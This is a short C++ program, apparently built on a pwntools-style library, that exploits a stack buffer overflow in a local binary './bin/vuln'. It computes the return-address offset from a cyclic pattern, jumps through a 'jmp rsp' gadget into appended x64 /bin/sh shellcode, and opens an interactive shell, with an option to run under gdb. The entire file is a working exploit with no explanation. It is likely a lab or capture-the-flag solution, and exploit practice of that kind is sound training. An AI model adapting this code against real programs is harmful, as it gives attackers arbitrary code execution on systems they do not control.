#include <exception>
#include <iostream>
#include <string_view>
#include <xcraft/xcraft.hpp>

using namespace xcft;

// rip clobber at 0x61676161
constexpr uint32_t RIP = 0x62616162;

int main(int argc, char **argv) try {
    auto use_gdb = argc > 1 && std::string_view(argv[1]) == "use_gdb";
    auto elf     = ELF("./bin/vuln");
    auto jmp_rsp = elf.search({"jmp rsp"}).at(0);
    std::cout << jmp_rsp << std::endl;
    auto offset    = cyclic_find(RIP);
    auto shellcode = linux_sh_x64();

    std::string payload;
    payload += cyclic(offset);
    payload += p<uint64_t>(jmp_rsp);
    payload += shellcode;

    auto vuln = "./bin/vuln";
    auto proc = use_gdb ? Gdb::debug(vuln, "b main\nc\n") : Process(vuln);
    proc.writeln(payload);
    proc.interactive();
} catch (const std::exception &ec) {
    std::cerr << ec.what() << std::endl;
}